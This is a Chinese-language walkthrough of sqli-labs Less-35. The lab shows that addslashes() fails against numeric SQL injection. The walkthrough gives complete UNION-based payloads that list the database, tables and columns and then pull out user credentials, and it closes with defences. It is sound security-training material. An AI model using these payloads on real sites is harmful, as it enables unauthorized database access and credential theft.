# 题目：Sqli-labs Less-35

## 题目描述
页面提示 `Please input the ID as parameter with numeric value`，底部有 `Hint: The Query String you input is escaped as : ...`，
会把经过 addslashes() 之后的输入原样回显。标题是 Less-35 **why care for addslashes()**。

## 核心原理与前置分析
这一关的 SQL 是数字型：
```php
$id = check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```
addslashes() 只做一件事：把 '、"、\、NULL 前面加上反斜杠。但这里 id 外面没有引号，我们要闭合的是“数字”，不是“字符串”——根本不需要单引号。
所以本关的考点不是“怎么绕过 addslashes”，而是：addslashes 只在有引号可闭合时才有意义；数字型注入面前，它形同虚设。
?id=1' 会报语法错误（1' 里的单引号被转义成 1\'，还是把语法搞坏了），但这不代表安全——用 and、or、union 这些不需要引号的语法，照样打穿。

## 解题思路
1. 直接测数字型逻辑：?id=1 or 1=1 能出数据，说明可注入；
2. order by 判列数；
3. union select 找回显位；
4. 依次爆库、表、字段、数据。

## 解题步骤
1. 确认数字型注入
```
?id=1 and 1=1 -- -   → Your Login name:Dumb
?id=1 and 1=2 -- -   → （空白，查不到）
```
条件真假能控制回显，数字型注入成立。
* **注意**:别被 ?id=1 or 1=0 迷惑：它的结果是有回显的。因为 MySQL 里 1 是“真值”，1 or 0 化简后等于 1，WHERE id=1 or 1=0 等价于 WHERE id=1，当然查到 Dumb。
要证明可注入，用 and 1=1 / and 1=2 这种前后对照才准确。

2. 判断列数
```
?id=-1%20order%20by%203--%20-
?id=-1%20order%20by%204--%20-
```
order by 3 不报错，order by 4 报 Unknown column '4' in 'order clause'，所以是 3 列。

3. 找回显位
```
?id=-1%20union%20select%201,2,3--%20-
```
回显
```
Your Login name:2
Your Password:3
```
第 2、3 列有回显。

4. 爆库名
```
?id=-1%20union%20select%201,database(),3--%20-
```
回显
```
Your Login name:security
Your Password:3
```

5.  爆表名
```
?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--%20-
```
回显
```
Your Login name:emails,referers,uagents,users
```

6. 爆字段名
```
?id=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273--%20-
```
回显
```
Your Login name:id,username,password
```

7. 爆账号密码
```
?id=-1%20union%20select%201,group_concat(username,0x3a,password),3%20from%20users--%20-
```
回显
```
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,...
Your Password:3
```

## 踩坑记录
1. 以为加了 addslashes 就不能注入。数字型注入不需要引号，union select 直接进。
2. 用 or 判断真假可能被“真值”骗到。?id=1 or 1=0 仍有回显，因为 1 本身为真；要对比就成对地用 and 1=1 / and 1=2。
3. ?id=1' 报错就以为没洞。报错恰恰说明 ' 被转义后破坏了语法，数字型照样可以打。
4. 忘了 LIMIT 0,1。id=1 时第一行被 Dumb 占掉，UNION 结果看不到，前半句要用 -1。
5. 注释符。-- - 里的空格别丢；URL 里写成 --%20- 或 #（%23）。

## 知识点总结
1. 数字型 vs 字符型：字符型要闭合引号，数字型不用；addslashes 只防字符型的引号闭合。
2. addslashes 的局限：它不理解 SQL 语法，只按字节加反斜杠；数字型上下文里，1 or 1=1、union select 都不需要引号。
3. UNION 三前提：列数相同、回显位对齐、前半句查空。
4. order by 判列数：报 Unknown column 'N' 说明列数小于 N。
**防御**: 预编译 + 参数绑定；id 做 is_numeric / 强转 (int)；关闭报错回显；最小权限。
